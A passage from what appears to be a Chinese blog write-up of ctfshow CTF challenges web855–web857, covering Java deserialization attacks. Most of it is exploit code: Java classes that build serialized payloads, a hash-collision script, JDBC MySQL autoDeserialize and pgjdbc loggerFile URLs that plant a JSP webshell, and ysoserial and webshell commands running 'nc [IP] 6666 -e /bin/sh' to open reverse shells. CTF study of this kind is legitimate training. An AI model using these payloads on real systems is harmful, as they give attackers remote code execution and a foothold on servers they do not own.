<pre><code class="java"> private void writeObject(ObjectOutputStream out) throws Exception &#123;
     //将名字反转写入二进制流
     out.writeInt(2135247942);
     out.writeByte(1);
     out.writeInt(0x36d);
     File filename = new File(&quot;D:\\IdeaProjects\\cc\\src\\main\\java\\com\\ctfshow\\entity\\payload&quot;); //gcc生成的文件位置
     BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename));
     ByteArrayOutputStream out2 = new ByteArrayOutputStream(1024);
     byte[] temp = new byte[1024];
     int size = 0;
     while((size = in.read(temp)) != -1)&#123;
         out2.write(temp, 0, size);
     &#125;
     in.close();
     byte[] content = out2.toByteArray();
     out.write(content);
     out.defaultWriteObject();
&#125;
</code></pre>
</li>
<li><p>生成序列化字符串：</p>
<pre><code class="java">package com.ctfshow.entity;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class web855 &#123;
    public static void main(String[] args)throws Exception &#123;
        User user = new User(&quot;dUfshow&quot;, &quot;0Q3456&quot;);
        ByteArrayOutputStream brr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(brr);
        oos.writeObject(user);
        String payload = new String(Base64.getEncoder().encode(brr.toByteArray()));
        System.out.println(payload);
    &#125;
&#125;
</code></pre>
</li>
<li><p>此时已经成功写入恶意文件，接下来就要想办法执行shellcode</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/45d011a1c3ba877d.png" style="zoom:80%;" /></li>
<li><p>这里的意思是用户名和密码不能为<code>ctfshow/123456</code>，但是又必须是admin身份</p>
</li>
<li><p>可以看到<code>equals</code>这里的逻辑是通过比较<code>hashcode</code>来判断是否相等</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/cffd5ded8a4ece2d.png" style="zoom:80%;" /></li>
<li><p>hash碰撞脚本：</p>
<pre><code class="python">def hashcode(val):
    h = 0
    for i in range(len(val)):
        h = 31 * h + ord(val[i])
    return h


t = &quot;ct&quot;
# t=&quot;12&quot;
for k in range(1, 128):
    for l in range(1, 128):
        if t != (chr(k) + chr(l)):
            if hashcode(t) == hashcode(chr(k) + chr(l)):
                print(t, chr(k) + chr(l))
</code></pre>
</li>
<li><p>可以用<code>dU</code>代替<code>ct</code>，<code>0Q</code>代替<code>12</code></p>
</li>
<li><p>修改<code>readobject</code>方法：</p>
<pre><code class="java">private void writeObject(ObjectOutputStream out) throws Exception &#123;
    out.writeInt(2135247942);
    out.writeByte(2);
    out.defaultWriteObject();
&#125;
</code></pre>
</li>
<li><p>重新生成序列化字符串，传入后触发<code>Runtime.getRuntime().exec(shellCode);</code>，成功执行命令</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/544243b53350fb53.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web856"><a href="#web856" class="headerlink" title="web856"></a>web856</h3><ul>
<li><p>jdbc反序列化</p>
</li>
<li><p>提示了所需环境的版本</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/19/f86cf52365afdb59.png" style="zoom:80%;" /></li>
<li><p>有一个User类</p>
<pre><code class="java">package com.ctfshow.entity;
 
import java.io.*;
 
public class User implements Serializable &#123;
    private static final long serialVersionUID = -7205095498817563965L;
    private String username;
    private String password;
 
    public User(String username, String password) &#123;
        this.username = username;
        this.password = password;
    &#125;
 
    public String getUsername() &#123;
        return username;
    &#125;
 
    public void setUsername(String username) &#123;
        this.username = username;
    &#125;
 
    public String getPassword() &#123;
        return password;
    &#125;
 
    public void setPassword(String password) &#123;
        this.password = password;
    &#125;
 
 
    @Override
    public boolean equals(Object o) &#123;
        if (this == o) return true;
        if (!(o instanceof User)) return false;
        User user = (User) o;
        return this.hashCode() == user.hashCode();
    &#125;
 
    @Override
    public int hashCode() &#123;
        return username.hashCode()+password.hashCode();
    &#125;
&#125;
</code></pre>
</li>
<li><p>还有一个Connection类：</p>
<pre><code class="java">package com.ctfshow.entity;
 
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Objects;
 
public class Connection implements Serializable &#123;
 
    private static final long serialVersionUID = 2807147458202078901L;
 
    private String driver;
 
    private String schema;
    private String host;
    private int port;
    private User user;
    private String database;
 
    public String getDriver() &#123;
        return driver;
    &#125;
 
    public void setDriver(String driver) &#123;
        this.driver = driver;
    &#125;
 
    public String getSchema() &#123;
        return schema;
    &#125;
 
    public void setSchema(String schema) &#123;
        this.schema = schema;
    &#125;
 
    public void setPort(int port) &#123;
        this.port = port;
    &#125;
 
    public String getHost() &#123;
        return host;
    &#125;
 
    public void setHost(String host) &#123;
        this.host = host;
    &#125;
 
 
    public User getUser() &#123;
        return user;
    &#125;
 
    public void setUser(User user) &#123;
        this.user = user;
    &#125;
 
    public String getDatabase() &#123;
        return database;
    &#125;
 
    public void setDatabase(String database) &#123;
        this.database = database;
    &#125;
 
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException &#123;
        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);
        ObjectInputStream.GetField gf = in.readFields();
        String host = (String) gf.get(&quot;host&quot;, &quot;127.0.0.1&quot;);
        int port = (int) gf.get(&quot;port&quot;,3306);
        User user = (User) gf.get(&quot;user&quot;,new User(&quot;root&quot;,&quot;root&quot;));
        String database = (String) gf.get(&quot;database&quot;, &quot;ctfshow&quot;);
        String schema = (String) gf.get(&quot;schema&quot;, &quot;jdbc:mysql&quot;);
        DriverManager.getConnection( schema+&quot;://&quot;+host+&quot;:&quot;+port+&quot;/?&quot;+database+&quot;&amp;user=&quot;+user.getUsername());
    &#125;
 
    @Override
    public boolean equals(Object o) &#123;
        if (this == o) return true;
        if (!(o instanceof Connection)) return false;
        Connection that = (Connection) o;
        return Objects.equals(host, that.host) &amp;&amp; Objects.equals(port, that.port) &amp;&amp; Objects.equals(user, that.user) &amp;&amp; Objects.equals(database, that.database);
    &#125;
 
    @Override
    public int hashCode() &#123;
        return Objects.hash(host, port, user, database);
    &#125;
&#125;
</code></pre>
</li>
<li><p>根据对所用库的提示，需要构造的payload应该是：</p>
<pre><code class="java">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
</code></pre>
</li>
<li><p>然后需要注意的是payload限制在commons-collections 4.0可用的链子</p>
</li>
<li><p>exp：</p>
<pre><code class="java">package com.ctfshow.entity;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Payload &#123;
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    &#125;
    public static void main(String[] args) throws Exception&#123;
        Connection connection = new Connection();
        Class&lt;? extends Connection&gt; aClass = connection.getClass();

        setFieldValue(connection,&quot;host&quot;,&quot;[IP]&quot;);
        setFieldValue(connection,&quot;port&quot;,3307);
        setFieldValue(connection,&quot;schema&quot;,&quot;jdbc:mysql&quot;);
        setFieldValue(connection,&quot;database&quot;,&quot;autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;);
        setFieldValue(connection,&quot;user&quot;,new User(&quot;root&quot;,&quot;root&quot;));


        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(connection);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
</li>
<li><p>生成payload：</p>
<pre><code class="sh">java -jar ysoserial.jar CommonsCollections4 &quot;nc [IP] 6666 -e /bin/sh&quot; &gt; payload
</code></pre>
</li>
<li><p>在vps上运行fakemysql服务，监听端口</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/19/c929d86ad557cb59.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web857"><a href="#web857" class="headerlink" title="web857"></a>web857</h3><ul>
<li><p>pgjdbc写马，有一个user类：</p>
<pre><code class="java">package com.ctfshow.entity;
 
import java.io.*;
 
public class User implements Serializable &#123;
    private static final long serialVersionUID = -7205095498817563965L;
    private String username;
    private String password;
 
    public User(String username, String password) &#123;
        this.username = username;
        this.password = password;
    &#125;
 
    public String getUsername() &#123;
        return username;
    &#125;
 
    public void setUsername(String username) &#123;
        this.username = username;
    &#125;
 
    public String getPassword() &#123;
        return password;
    &#125;
 
    public void setPassword(String password) &#123;
        this.password = password;
    &#125;
 
 
    @Override
    public boolean equals(Object o) &#123;
        if (this == o) return true;
        if (!(o instanceof User)) return false;
        User user = (User) o;
        return this.hashCode() == user.hashCode();
    &#125;
 
    @Override
    public int hashCode() &#123;
        return username.hashCode()+password.hashCode();
    &#125;
 
&#125;
</code></pre>
</li>
<li><p>一个Connection类：</p>
<pre><code class="java">package com.ctfshow.entity;
 
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Objects;
 
public class Connection implements Serializable &#123;
 
    private static final long serialVersionUID = 2807147458202078901L;
 
    private String driver;
 
    private String schema;
    private String host;
    private int port;
    private User user;
    private String database;
 
    public String getDriver() &#123;
        return driver;
    &#125;
 
    public void setDriver(String driver) &#123;
        this.driver = driver;
    &#125;
 
    public String getSchema() &#123;
        return schema;
    &#125;
 
    public void setSchema(String schema) &#123;
        this.schema = schema;
    &#125;
 
    public void setPort(int port) &#123;
        this.port = port;
    &#125;
 
    public String getHost() &#123;
        return host;
    &#125;
 
    public void setHost(String host) &#123;
        this.host = host;
    &#125;
 
 
    public User getUser() &#123;
        return user;
    &#125;
 
    public void setUser(User user) &#123;
        this.user = user;
    &#125;
 
    public String getDatabase() &#123;
        return database;
    &#125;
 
    public void setDatabase(String database) &#123;
        this.database = database;
    &#125;
 
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException &#123;
 
        ObjectInputStream.GetField gf = in.readFields();
        String host = (String) gf.get(&quot;host&quot;, &quot;127.0.0.1&quot;);
        String  driver = (String) gf.get(&quot;driver&quot;,&quot;com.mysql.jdbc.Driver&quot;);
        int port = (int) gf.get(&quot;port&quot;,3306);
        User user = (User) gf.get(&quot;user&quot;,new User(&quot;root&quot;,&quot;root&quot;));
        String database = (String) gf.get(&quot;database&quot;, &quot;ctfshow&quot;);
        String schema = (String) gf.get(&quot;schema&quot;, &quot;jdbc:mysql&quot;);
        Class.forName(driver);
        DriverManager.getConnection( schema+&quot;://&quot;+host+&quot;:&quot;+port+&quot;/?&quot;+database+&quot;&amp;user=&quot;+user.getUsername());
    &#125;
 
    @Override
    public boolean equals(Object o) &#123;
        if (this == o) return true;
        if (!(o instanceof Connection)) return false;
        Connection that = (Connection) o;
        return Objects.equals(host, that.host) &amp;&amp; Objects.equals(port, that.port) &amp;&amp; Objects.equals(user, that.user) &amp;&amp; Objects.equals(database, that.database);
    &#125;
 
    @Override
    public int hashCode() &#123;
        return Objects.hash(host, port, user, database);
    &#125;
&#125;
</code></pre>
</li>
<li><p>Connection类的<code>readObject</code>方法执行了<code>DriverManager.getConnection</code>操作，如果把它的参数恶意构造为pdjdbc反序列化的url，就可以利用了</p>
</li>
<li><p>构造成这个样子就可以了<code>jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&amp;loggerFile=./hack.jsp&amp;&lt;%25[恶意代码];%25&gt;</code></p>
</li>
<li><p>由于Connection类里的成员变量都是私有的，需要反射获取类，然后使用<code>setAccessible</code>方法修改属性</p>
</li>
<li><p>payload：</p>
<pre><code class="java">package com.ctfshow.entity;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Payload &#123;
    public static void main(String[] args) throws Exception&#123;
        Connection connection = new Connection();
        Class&lt;? extends Connection&gt; aClass = connection.getClass();
        Field driver = aClass.getDeclaredField(&quot;driver&quot;);
        driver.setAccessible(true);
        driver.set(connection,&quot;org.postgresql.Driver&quot;);
        Field host = aClass.getDeclaredField(&quot;host&quot;);
        host.setAccessible(true);
        host.set(connection,&quot;127.0.0.1&quot;);
        Field port = aClass.getDeclaredField(&quot;port&quot;);
        port.setAccessible(true);
        port.set(connection,5432);
        Field user = aClass.getDeclaredField(&quot;user&quot;);
        user.setAccessible(true);
        user.set(connection,new User(&quot;hoylindo&quot;,&quot;123456&quot;));
        Field schema = aClass.getDeclaredField(&quot;schema&quot;);
        schema.setAccessible(true);
        schema.set(connection,&quot;jdbc:postgresql&quot;);
        Field database = aClass.getDeclaredField(&quot;database&quot;);
        database.setAccessible(true);
        database.set(connection,&quot;password=123456&amp;loggerLevel=debug&amp;loggerFile=../webapps/ROOT/hack.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(\&quot;i\&quot;));%&gt;&quot;);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(connection);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
</li>
<li><p>访问hack.jsp传入<code>i=nc%20[IP]%206666%20-e%20sh</code></p>
<img src="https://s3.bmp.ovh/imgs/2023/12/19/6b1c3643bf62a2b5.png" style="zoom:80%;" /></li>
</ul>

    </div>

    
</div>
                     
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2022 - 2023 Hoylindo
            <span class="footer-icon">
                <a-icon type="flag" theme="filled" /></span>
            @hoylindo
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>

</footer>

<script src="/js/highlight.min.js"></script>
<script src="/js/particle.js"></script>
                </div>
            </div>
        </transition>
    </div>

    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
    <script src="/js/1.js"></script>
    
    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
    <script type="text/javascript" src="/js/aixin.js"></script>
    <script type="text/javascript" src="/js/anime.min.js"></script>
    <script type="text/javascript" src="/js/fireworks.js"></script>

    <script>
    new Vue({
        el: "#layout",
        data: {
            show_page: false,
            onload_menu: false,
            menu_show: false,
            card_top: 100
        },
        created: function () {
            var that = this
            window.onload = function () {
                that.show_page = true
                document.getElementById("loadcontent").style.opacity = 0
                setTimeout(function () {
                    document.getElementById("loadleft").style.width = 0
                    document.getElementById("loadright").style.width = 0
                }, 300)
                setTimeout(function () {
                    document.getElementById("loading").style = "display:none"
                }, 600)
            }
        },
        mounted: function () {
            var that = this
            window.addEventListener('scroll', function (e) {
                that.menu_show = false
            })
        },
        methods: {
            home_click: function () {
                window.scrollTo({
                    top: window.innerHeight - 80,
                    behavior: "smooth",
                });
            }
        }
    })
</script>

</body>

</html>